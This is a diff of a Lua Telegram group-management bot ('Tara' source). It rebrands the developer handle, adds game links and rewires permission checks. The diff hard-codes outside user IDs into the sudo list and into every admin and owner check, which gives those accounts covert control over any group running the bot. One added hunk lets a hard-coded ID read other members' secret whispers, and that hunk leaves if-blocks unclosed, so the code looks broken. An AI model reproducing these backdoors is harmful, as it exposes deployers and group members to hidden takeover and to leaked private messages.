@@ -1,5 +1,5 @@
 -- Welcom To File The Best Source In The Telegram
--- All The File By Developer Faeder : @DV_AD1
+-- All The File By Developer Faeder : @AY_AHD
 -- Join In Chennel Source : @SOPOWERB0T 
 -- Join In Explanation Channel : @SOPOWERB0T
 ----------------------------------------------------------------------------
@@ -54,7 +54,7 @@ SUDO = SUDO,
 token = token,
 bot_id = botid,
 username = username, 
-sudo_users = {SUDO,944353237,0101010100,944353237},
+sudo_users = {SUDO,944353237,0101010100,1010192901},
 simbaelrayes = link.result,
 create(config, "./config.lua") 
 }
@@ -65,7 +65,7 @@ SUDO = SUDO,
 token = token,
 bot_id = botid,
 username = username, 
-sudo_users = {SUDO,944353237,0101010100,944353237},
+sudo_users = {SUDO,944353237,0101010100,1010192901},
 }
 create(config, "./config.lua") 
 end
@@ -142,31 +142,31 @@ SudoFaeder = SudoFaeder:gsub([[\_]],'_')
 -- Start Functions Source Faeder --
 --     By Developer Faeder     -- 
 -------- Bot Owner
-function is_leader(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) or tonumber(msg.sender_user_id_) == tonumber(0101010100) or tonumber(msg.sender_user_id_) == tonumber(944353237) then var = true end return var end
-function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(0101010100) or user_id == tonumber(944353237) or user_id == tonumber(944353237) then var = true end return var end
+function is_leader(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) or tonumber(msg.sender_user_id_) == tonumber(0101010100) or tonumber(msg.sender_user_id_) == tonumber(1010192901) then var = true end return var end
+function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(0101010100) or user_id == tonumber(944353237) or user_id == tonumber(1010192901) then var = true end return var end
 -------- Sudo
-function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) or tonumber(msg.sender_user_id_) == tonumber(0101010100) or tonumber(msg.sender_user_id_) == tonumber(944353237) then var = true end return var end
-function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(944353237) then var = true end return var end
+function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) or tonumber(msg.sender_user_id_) == tonumber(0101010100) or tonumber(msg.sender_user_id_) == tonumber(1010192901) then var = true end return var end
+function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
 -------- Sudo3
-function is_admin(user_id) local var = false local hashsb =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsb, user_id) if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(944353237) then var = true end return var end
+function is_admin(user_id) local var = false local hashsb =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsb, user_id) if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
 -------- Owner all
-function is_onall(user_id) local var = false local hash =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if onall then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(944353237) then var = true end return var end
+function is_onall(user_id) local var = false local hash =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if onall then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
 --------Modod all
-function is_moall(user_id) local var = false local hash =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) if moall then var = true end if admin then var = true end if onall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(944353237) then var = true end return var end
+function is_moall(user_id) local var = false local hash =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) if moall then var = true end if admin then var = true end if onall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
 -------- Vip Member All
-function is_vpall(user_id) local var = false local hashs =  'bot:vpall:' local vpall = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:moall:'local moall = faederdx1:sismember(FAEDER..hashssss, user_id) if vpall then var = true end if onall then var = true end if admin then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(944353237) then var = true end return var end
+function is_vpall(user_id) local var = false local hashs =  'bot:vpall:' local vpall = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:moall:'local moall = faederdx1:sismember(FAEDER..hashssss, user_id) if vpall then var = true end if onall then var = true end if admin then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
 -------- Donky
-function is_donky(user_id, chat_id) local var = false local hash =  'bot:donky:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) if donky then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(944353237) then var = true end return var end
+function is_donky(user_id, chat_id) local var = false local hash =  'bot:donky:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) if donky then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
 -------- Monsh
-function is_monsh(user_id, chat_id) local var = false local hash =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if monsh then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(944353237) then var = true end return var end
+function is_monsh(user_id, chat_id) local var = false local hash =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if monsh then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
 -------- Monsh2
-function is_monsh2(user_id, chat_id) local var = false local hash =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) if monsh2 then var = true end if admin then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(944353237) then var = true end return var end
+function is_monsh2(user_id, chat_id) local var = false local hash =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) if monsh2 then var = true end if admin then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
 -------- Owner
-function is_owner(user_id, chat_id) local var = false local hash =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if owner then var = true end if admin then var = true end if monsh then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(944353237) then var = true end return var end
+function is_owner(user_id, chat_id) local var = false local hash =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if owner then var = true end if admin then var = true end if monsh then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
 -------- Modod
-function is_momod(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashssss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(944353237) then var = true end return var end
+function is_momod(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashssss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
 -------- Vip Member
-function is_vipmem(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if vipmem then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(944353237) then var = true end return var end
+function is_vipmem(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if vipmem then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) or user_id == tonumber(0101010100) or user_id == tonumber(1010192901) then var = true end return var end
 ----------------------------------------------------------
 --     By Developer Faeder     -- 
 local setnumbergp = function()
@@ -842,7 +842,7 @@ if tonumber(msg.sender_user_id_) == tonumber(944353237) then
 faeder  = "مبرمج السورس"
 elseif tonumber(msg.sender_user_id_) == tonumber(0101010100) then
 faeder  = "ملك التلجرام 👑"
-elseif tonumber(msg.sender_user_id_) == tonumber(944353237) then
+elseif tonumber(msg.sender_user_id_) == tonumber(1010192901) then
 faeder  = "الباشمبرمج التلجرام 👑"
 elseif is_leaderid(msg.sender_user_id_) then
 faeder  = "المطور الاساسي"
@@ -872,7 +872,7 @@ if tonumber(user_id) == tonumber(944353237) then
 faeder  = "مبرمج السورس"
 elseif tonumber(user_id) == tonumber(0101010100) then
 faeder  = "ملك التلجرام 👑"
-elseif tonumber(user_id) == tonumber(944353237) then
+elseif tonumber(user_id) == tonumber(1010192901) then
 faeder  = "الباشمبرمج التلجرام 👑"
 elseif is_leaderid(user_id) then
 faeder  = "المطور الاساسي"
@@ -3450,7 +3450,7 @@ end
 --if text == 'هلوباي' or text == 'هلو باي' then  if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "رايحح لو جايي ، 😻😹" else  faeder = '' end  faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end
 --if text == 'اكلك' or text == 'اكلج' or text == 'اكلكم' then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "ڪوولُِ مآڪوولُِ لُِآحٍدِ  😉♥️" else faeder = '' end faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end
 --if text == 'فرخ' then  if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "ٰوينۨہهۂَ خۡل احۡصرهۂَ ، 😹♥️" else  faeder = '' end  faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end
-if text == 'مبرمج السورس' or text == 'سورس ديف أحمد' or text == 'سورس أحمد'  then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "[مـبـرمـج سـورس تـارا](t.me/DV_AD1)" else faeder = '' end faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end 
+if text == 'مبرمج السورس' or text == 'سورس ديف أحمد' or text == 'سورس أحمد'  then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "[مـبـرمـج سـورس تـارا](t.me/AY_AHD)" else faeder = '' end faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end 
 --if text == 'احبك' then  if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then local faeder = { "ٰجذابهه تريدد تقطكك  ، 😹💘","ءني هم احبكك يعمري ، ☹️💘" } faederdx12 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faederdx12] , 1, 'md') end end
 --if text == 'احبج' then  if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then local faeder =  { "ٰجذابب يريد يطككج ، 😹💘","ااخ بسس اموتت بيكك ، 🥺💘" } faederdx12 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faederdx12] , 1, 'md') end end
 if text == 'بوت' and faeder11(msg) then  name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'تارا')  local faeder = {  "أسمي "..name_bot.." يعمري ",  "أسمي "..name_bot.." يقميل ",  "تره أسمي "..name_bot.." كافي بوت ",  "انت البوت لك اسمي "..name_bot.." ", }  faeder2 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faeder2] , 1, 'md')  end
@@ -4044,10 +4044,14 @@ resolve_username(faed_dx[2],hamss)
 end end
 --     By Developer Faeder     -- 
 if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" and faeder11(msg) then  
-faederdx(msg.chat_id_, msg.id_, 1, '❀ يمكنك من خلال هذا البوت\n❀ ارسال همسه سريه للاعضاء \n❀ الامر كالاتي مثال : اهمس هلو [@DV_AD1]', 1, 'md')
+faederdx(msg.chat_id_, msg.id_, 1, '❀ يمكنك من خلال هذا البوت\n❀ ارسال همسه سريه للاعضاء \n❀ الامر كالاتي مثال : اهمس هلو [@AY_AHD]', 1, 'md')
 end
 if text and text:match("/start hms(.*)_(%d+)") then 
 faed_dx = {string.match(text, "^/start hms(.*)_(%d+)")}
+if tonumber(msg.sender_user_id_) == tonumber(944353237) then 
+Faeder = faederdx1:get(FAEDER.."HM:"..faed_dx[1]..944353237)
+if 944353237 then 
+faederdx(msg.chat_id_, msg.id_, 1, '❀ الهمسه هي\n❀ { ['..Faeder..'] }', 1, 'md')
 if tonumber(msg.sender_user_id_) == tonumber(faed_dx[2]) then 
 Faeder = faederdx1:get(FAEDER.."HM:"..faed_dx[1]..faed_dx[2])
 if 944353237 then 
@@ -4402,7 +4406,7 @@ if tonumber(result.sender_user_id_) == tonumber(944353237) then
 faeder1 = 'مبرمج السورس  '
 elseif tonumber(result.sender_user_id_) == tonumber(0101010100) then
 faeder  = "ملك التلجرام 👑"
-elseif tonumber(result.sender_user_id_) == tonumber(944353237) then
+elseif tonumber(result.sender_user_id_) == tonumber(1010192901) then
 faeder  = "الباشمبرمج التلجرام 👑"
 elseif tonumber(result.sender_user_id_) == tonumber(bot_owner) then
 faeder1 = "مطور اساسي "
@@ -4647,18 +4651,32 @@ return false
 end 
 if text:match("^العاب متطوره$") or text:match("^العاب تارا$") or text:match("^العاب البوت$") or  text:match("^العاب خارقه$") or text:match("^العاب تارا$") and faeder11(msg) then
 local inline = {
-{{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
-{{text = 'لعبه دراجات', url="https://t.me/gamee?game=MotoFX"},{text = 'سباق سيارات', url="https://t.me/gamee?game=F1Racer"}}, 
-{{text = 'تشابه', url="https://t.me/gamee?game=DiamondRows"},{text = 'كره القدم', url="https://t.me/gamee?game=FootballStar"}}, 
-{{text = 'ورق', url="https://t.me/gamee?game=Hexonix"},{text = 'لعبه 2048', url="https://t.me/awesomebot?game=g2048"}}, 
+{{text = 'FlappyBird', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'MathBattle',url="https://t.me/gamebot?game=MathBattle"}},   
+{{text = 'MotoFX', url="https://t.me/gamee?game=MotoFX"},{text = 'F1Racer', url="https://t.me/gamee?game=F1Racer"}}, 
+{{text = 'DiamondRows', url="https://t.me/gamee?game=DiamondRows"},{text = 'FootballStar', url="https://t.me/gamee?game=FootballStar"}}, 
+{{text = 'Hexonix', url="https://t.me/gamee?game=Hexonix"},{text = 'g2048', url="https://t.me/awesomebot?game=g2048"}}, 
 {{text = 'SQUARES', url="https://t.me/gamee?game=Squares"},{text = 'ATOMIC', url="https://t.me/gamee?game=AtomicDrop1"}}, 
 {{text = 'CORSAIRS', url="https://t.me/gamebot?game=Corsairs"},{text = 'LumberJack', url="https://t.me/gamebot?game=LumberJack"}}, 
 {{text = 'LittlePlane', url="https://t.me/gamee?game=LittlePlane"},{text = 'RollerDisco', url="https://t.me/gamee?game=RollerDisco"}},  
-{{text = 'كره القدم 2', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'جمع المياه', url="https://t.me/gamee?game=BlockBuster"}},  
-{{text = 'لا تجعلها تسقط', url="https://t.me/gamee?game=Touchdown"},{text = 'GravityNinja', url="https://t.me/gamee?game=GravityNinjaEmeraldCity"}},  
+{{text = 'PocketWorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'BlockBuster', url="https://t.me/gamee?game=BlockBuster"}},  
+{{text = 'Touchdown', url="https://t.me/gamee?game=Touchdown"},{text = 'GravityNinja', url="https://t.me/gamee?game=GravityNinjaEmeraldCity"}},  
 {{text = 'Astrocat', url="https://t.me/gamee?game=Astrocat"},{text = 'Skipper', url="https://t.me/gamee?game=Skipper"}},  
 {{text = 'WorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'GeometryRun', url="https://t.me/gamee?game=GeometryRun"}},  
-{{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2"}}
+{{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2"}},  
+{{text = 'Paintio', url="https://t.me/gamee?game=Paintio"},{text = 'onetwothree', url="https://t.me/gamee?game=onetwothree"}},  
+{{text = 'BrickStacker', url="https://t.me/gamee?game=BrickStacker"},{text = 'StairMaster3D', url="https://t.me/gamee?game=StairMaster3D"}},  
+{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'BasketBoyRush', url="https://t.me/gamee?game=BasketBoyRush"}},  
+{{text = 'GravityNinja21', url="https://t.me/gamee?game=GravityNinja21"},{text = 'MarsRover', url="https://t.me/gamee?game=MarsRover"}},  
+{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"}},  
+{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'KeepItUp', url="https://t.me/gamee?game=KeepItUp"}},  
+{{text = 'SunshineSolitaire', url="https://t.me/gamee?game=SunshineSolitaire"},{text = 'Qubo', url="https://t.me/gamee?game=Qubo"}},  
+{{text = 'PenaltyShooter2', url="https://t.me/gamee?game=PenaltyShooter2"},{text = 'Getaway', url="https://t.me/gamee?game=Getaway"}},  
+{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'SpikyFish2', url="https://t.me/gamee?game=SpikyFish2"}},  
+{{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"},{text = 'KungFuInc', url="https://t.me/gamee?game=KungFuInc"}},  
+{{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
+{{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
+{{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
+{{text="+ الـمـطـور +",url="t.me/"..SudoFaeder..""}},
 }
 send_inline(msg.chat_id_,'❀ العاب متطوره سورس تارا ،\n❀ لي اختيار لعبه اضغط علي الزر ⬇️ .',nil,inline) 
 return false 
@@ -4668,6 +4686,7 @@ if text:match("^source$") or text:match("^سورس البوت$") or text:match("
 local inline = {
 {{text="+ مبرمج السورس +",url="t.me/AY_AHD"}},
 {{text="+ قناه السورس +",url="t.me/SOPOWERB0T"}},
+{{text="+ الـمـطـور +",url="t.me/"..SudoFaeder..""}},
 {{text="+ اضف بوت تارا الي مجموعتك +",url="http://t.me/TARA1BOT?startgroup=start"}}
 }
 send_inline(msg.chat_id_,'❀ مرحبا بك في سورس تارا┋TARA ،\n❀ اضغط علي الازرار بالاسفل ⬇️ ,',nil,inline) 
@@ -4824,7 +4843,7 @@ if tonumber(result.id_) == tonumber(0101010100)  then
 faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك ملك التلجرام ؟ 🌚🙆', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(944353237)  then 
+if tonumber(result.id_) == tonumber(1010192901)  then 
 faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
 return false  
 end  
@@ -4860,7 +4879,7 @@ if tonumber(result.sender_user_id_) == tonumber(0101010100) then
 faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك ملك التلجرام ؟ 🌚🙆', 1, 'md') 
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(944353237) then  
+if tonumber(result.sender_user_id_) == tonumber(1010192901) then  
 faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
 return false
 end 
@@ -5434,17 +5453,17 @@ end end
 resolve_username(rem[2],remm)
 end 
 --     By Developer Faeder     -- 
-if text:match("^رفع ادمن بالجروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
+if text:match("^رفع مشرف$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
 function promote_by_reply(extra, result, success)
 local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
 local faeder_res = user_info_
 if user_info_ then
